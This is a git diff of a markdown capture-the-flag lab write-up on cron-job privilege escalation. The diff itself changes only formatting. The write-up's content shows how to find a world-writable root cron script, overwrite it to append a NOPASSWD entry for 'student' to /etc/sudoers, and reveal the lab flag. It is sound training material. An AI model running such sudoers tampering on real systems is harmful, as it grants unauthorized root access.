@@ -2,10 +2,10 @@
 
 ## Lab 1
 
->  🔬 [Cron Jobs Gone Wild II](https://www.attackdefense.com/challengedetails?cid=77)
+> 🔬 [Cron Jobs Gone Wild II](https://www.attackdefense.com/challengedetails?cid=77)
 >
->  - **Cron Jobs** Privilege escalation
->  - Already logged on as `student` unprivileged user
+> * **Cron Jobs** Privilege escalation
+> * Already logged on as `student` unprivileged user
 
 ```bash
 whoami
@@ -26,7 +26,7 @@ ls -l
 
 ### Cron Jobs Identify
 
-- Look for all occurences of the path or the file, on the system
+* Look for all occurences of the path or the file, on the system
 
 ```bash
 find / -name message
@@ -41,14 +41,14 @@ grep -rnw /usr -e "/home/student/message"
 	/usr/local/share/copy.sh:2:cp /home/student/message /tmp/message
 ```
 
-- The file has been copied into the /tmp directory
+* The file has been copied into the /tmp directory
 
 ```bash
 cat /tmp/message
 	Hey!! you are not root :(
 ```
 
-- Check `copy.sh` privileges
+* Check `copy.sh` privileges
 
 ```bash
 ls -al /usr/local/share/copy.sh
@@ -62,10 +62,10 @@ cat /usr/local/share/copy.sh
 
 ### Privesc
 
-- Every user account has read/write/execute permissions on the `copy.sh` script
-- The script is writable by the `student` user. Modify the script to execute a command (`e.g.` a*dding **student** to `sudoers` file*).
-  - When the script is executed by `root` cron job (*every 1 min for this lab*), it will run commands with pivileged permissions
-  - No text editors available in the lab
+* Every user account has read/write/execute permissions on the `copy.sh` script
+* The script is writable by the `student` user. Modify the script to execute a command (`e.g.` a_dding **student** to `sudoers` file_).
+  * When the script is executed by `root` cron job (_every 1 min for this lab_), it will run commands with pivileged permissions
+  * No text editors available in the lab
 
 ```bash
 printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
@@ -98,18 +98,14 @@ crontab -l
 	*/01 * * * * sh /usr/local/share/copy.sh *
 ```
 
-
-
 <details>
+
 <summary>Reveal Flag: 🚩</summary>
-
-
 
 `697914df7a07bb9b718c8ed258150164`
 
-![](.gitbook/assets/image-20230319192539065.png)
+<img src=".gitbook/assets/image-20230319192539065.png" alt="" data-size="original">
 
 </details>
 
-------
-
+***
